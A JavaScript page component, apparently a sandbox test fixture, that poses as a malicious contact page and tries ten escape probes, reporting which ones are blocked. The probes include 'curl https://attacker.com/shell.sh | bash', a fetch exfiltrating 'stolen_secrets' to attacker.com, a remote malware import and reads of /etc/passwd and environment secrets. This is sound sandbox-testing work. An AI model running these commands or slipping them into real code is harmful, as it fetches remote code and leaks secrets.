// Contact page - with simulated "malicious" supply chain attack code

export async function render(props) {
  const attacks = [];

  // 1. Try to read environment variables (steal secrets)
  try {
    const env = process.env;
    attacks.push("ENV_ACCESS: FAILED TO BLOCK - got " + JSON.stringify(env));
  } catch (e) {
    attacks.push("ENV_ACCESS: Blocked - " + e.message);
  }

  // 2. Try to access filesystem (read /etc/passwd, SSH keys, etc.)
  try {
    const fs = await import("fs");
    const data = fs.readFileSync("/etc/passwd", "utf8");
    attacks.push("FS_READ: FAILED TO BLOCK - got " + data.slice(0, 50));
  } catch (e) {
    attacks.push("FS_READ: Blocked - " + e.message);
  }

  // 3. Try to spawn a reverse shell
  try {
    const cp = await import("child_process");
    cp.execSync("curl https://attacker.com/shell.sh | bash");
    attacks.push("SHELL_EXEC: FAILED TO BLOCK");
  } catch (e) {
    attacks.push("SHELL_EXEC: Blocked - " + e.message);
  }

  // 4. Try to exfiltrate data via network
  try {
    await fetch("https://attacker.com/exfil?data=stolen_secrets");
    attacks.push("FETCH: FAILED TO BLOCK");
  } catch (e) {
    attacks.push("FETCH: Blocked - " + e.message);
  }

  // 5. Try dynamic import from remote URL
  try {
    await import("https://attacker.com/malware.js");
    attacks.push("REMOTE_IMPORT: FAILED TO BLOCK");
  } catch (e) {
    attacks.push("REMOTE_IMPORT: Blocked - " + e.message);
  }

  // 6. Try path traversal to escape sandbox
  try {
    await import("../../../etc/passwd");
    attacks.push("PATH_TRAVERSAL: FAILED TO BLOCK");
  } catch (e) {
    attacks.push("PATH_TRAVERSAL: Blocked - " + e.message);
  }

  // 7. Try to access Deno APIs (if any leaked)
  try {
    const data = await Deno.readTextFile("/etc/passwd");
    attacks.push("DENO_API: FAILED TO BLOCK - got " + data.slice(0, 50));
  } catch (e) {
    attacks.push("DENO_API: Blocked - " + e.message);
  }

  // 8. Try eval (should work but can't do anything dangerous)
  try {
    const result = eval('1 + 1');
    attacks.push("EVAL: Allowed (harmless) - result: " + result);
  } catch (e) {
    attacks.push("EVAL: Blocked - " + e.message);
  }

  // 9. Try to access globalThis for dangerous APIs
  try {
    const dangerous = globalThis.process || globalThis.require || globalThis.Deno;
    if (dangerous) {
      attacks.push("GLOBAL_DANGEROUS: FAILED TO BLOCK - found dangerous global");
    } else {
      attacks.push("GLOBAL_DANGEROUS: Blocked - no dangerous globals found");
    }
  } catch (e) {
    attacks.push("GLOBAL_DANGEROUS: Blocked - " + e.message);
  }

  // 10. Try WebAssembly instantiation (potential sandbox escape vector)
  try {
    const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0]);
    const wasmModule = new WebAssembly.Module(wasmCode);
    attacks.push("WASM: Allowed (but can't escape V8 sandbox)");
  } catch (e) {
    attacks.push("WASM: Blocked - " + e.message);
  }

  return `<main>
    <h2>Contact (Malicious Page)</h2>
    <p>This page simulates a supply chain attack. All dangerous operations should be blocked:</p>
    <pre style="background:#111;color:#0f0;padding:1em;overflow-x:auto;">${attacks.join("\n")}</pre>
    <h3>Summary</h3>
    <p>Blocked: ${attacks.filter(a => a.includes("Blocked")).length} / ${attacks.length}</p>
  </main>`;
}
